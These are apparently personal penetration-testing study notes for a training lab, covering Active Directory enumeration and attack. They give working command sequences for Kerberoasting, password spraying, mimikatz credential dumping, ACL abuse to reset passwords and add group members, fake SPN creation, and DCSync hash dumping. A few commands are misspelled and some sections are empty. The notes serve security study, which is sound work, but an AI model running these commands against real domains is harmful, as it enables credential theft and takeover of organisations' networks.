# Active Directory 
Related: 
Terminology 
- Active Directory
- GPO
- SID
- GUID
## External Enumeration 
### What to look for 
- IP space 
- Domain information 
- Schema format 
- Data disclosures 
- Breach data
### Where to look  

[DomainTools](https://whois.domaintools.com/)

[PTR-Arcive](https://www.whatsmydns.net/dns-lookup/ptr-records)

[TruffleHog](https://github.com/trufflesecurity/truffleHog)

[Linkedin2Username](https://github.com/initstring/linkedin2username)

[DeHashed](https://dehashed.com/search#breachCheck)

[HaveIBeenPwned](https://haveibeenpwned.com/)
- Public Websites 
- Google Dorking
## Password Spraying 
**Linux** 
**Windows**
## Internal Enumeration 

```
Import-Module ActiveDirectory 
Get-Module
```

``` 
Get-ADDomain 
```

```
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

```
Get-ADTrust -Filter * 
```

```
Get-ADGroup -Filter * | select name 
```


```
Get-ADGroup -Identity "Backup Operators"
```
### Powerview

```
Get-Domain 
```

```
Get-DomainController # returns list of domain controllers for specific domain 
Get-ADDomainController # returns domain controller ip address, needed for GetUserSPN.py 
```

```
Get DomainUser #Will return all users or specific user objects in AD 
```

```
GetDomainComputer 
```
``` 
GetDomainGroup

```
```
Get-DomainOU #searches for all specific OU objects in active directory

#OU: A container used to organize objects (like users, groups, and computers) within a domain into a logical hierarchy that mirrors your organization's structure, such as departments (e.g., HR, IT) or geographic locations (e.g., New York, London).
```

```
FindInterestingDomainAcl

```

```
Get-DomainGroupMember
```
```
Get-DomainFileServer
```
```
Get-DomainDFShare
```

**GPO Enumeration**
```
Get-DomainGPO 
```
```
Get-DomainPolicy 
```
**Computer Enumeration** 
```
Get-NetLocalGroup 
Get-NetLocalGroupMember
Get-NetShare 
Test-AdminAccess
Find-DomainUserLocation
Find-DomainShare # Finds reachable shares on domain machines 
FindInterestingDomainShareFile # Searches for files matching specific criteria on readable shares in the domain 
```
**Domain User Information**
```
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

Get-DomainUser -Admin Count
```
```
Get-DomainGroupMember -Identity "Domain Admins" -Recurse #Used to find users that are part of a target group through nested membership and list them. 
```

**Trust Enumeration** 
```
Get-DomainTrustMapping 
```

```
Test-AdminAccess -Computer ACADEMY-EA-MS01 
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

### Sharpview 
- Similar capabilities to powerview 
### Bloodhound / SharpHound
> [!NOTE]  
> Must be domain user from Windows attack host positioned within network but not joined to the domain OR transfer tool to domain-joined host 

- Type 'bloodhound' into cmd or powershell 
- Enter credentials 
- Click on upload data and open 

- Can start by typing domain 
- View result of pre-built queries in analyiss tab

Find Computers where Domain Users are Local Admin

## Exploitation (from Linux)
> [!NOTE]  
> Requires domain user, cleartext password or hash, a shell in context of user or a shell in context of system. Must also know which host is domain controller so we can query it 

**Kerberoasting**
```
sudo python3 -m pip install .

```
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```
## Exploitation (from Windows )


**Kerberoasting** 
```
Import-Module .\PowerView.ps1
Get-DomainUser * -SPN |Select samaccountname
Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
```

**Password Spraying**

```
wget https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1
Import-Module .\DomainPasswordSpray.ps1
tag:lateral-movement

```

**Pillaging** 

```
mimikatz.exe 
lasadump::secrets
token::elevate
```

```
$SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
```
## ACL
### ACL Rights & What They Mean 
GenericRight - all possible access rights 

GenericWrite - full write access

WriteDACL - Can grant yourself right to add members to a group, grant full control over a user, , computer, domain, or GPO 


WriteDACL
```
Find-InterestingDomainACL
```


### Changing User Password Based on ACL Information 
> [!NOTE]  
> Must authenticate as user who can force change passwords
1. Creates PSCredential Object
``` 
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
```
```
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```
2. Creates secure string object that represents password for target user
```
$target-user-Password = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```
3. Sets domain user password
```
cd Tools 
Impot-Module .\Powerview.ps1 
Set-DomainUserPassword -Identity target-user -AccountPassword $target-user-password -Credentials $Cred -Verbose
```
### Adding Target User To Privileged Group

[!NOTE]  
>What all is required to make this possible?
>Process: Create fake SPN -> Use rubeus.exe -> crack hashes -> cleanup

**Step 1** 
```
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```
**Step 2** 
```
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\target-user', $SecPassword)
```
**Step 3**
```
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

```
### Creating fake SPN 
 
> [!NOTE]  
>Must be authenticated as member of group to be successful. 
> Process: Create fake SPN -> Use rubeus.exe -> crack hashes -> cleanup 

**Fake SPN Creation**
```
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```
**Cleanup** 
1. Remove fake SPN created for adunn user 
```
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```
2. Remove damundsen user for Help Desk 1 group 
 ```powershell
 Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
 
 ```

3. Confirm group removal 
```
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```
### DSync 

[!NOTE]  
>Must have control over account that has right to perform domain replication

**Method 1**
```
Get-DomainUser -Identity user-of-interest  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```
```
$sid = "sid" 
```
```
Get-ObjectACL "DC=Domain-Controller,DC=local" ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
```
 secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/user-of-interest@172.16.5.5 
```
**Method 2**

[!NOTE]  
>Must be ran in context of user with DCSync privileges

```
.\mimikatz.exe

privilege::debug 

lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```
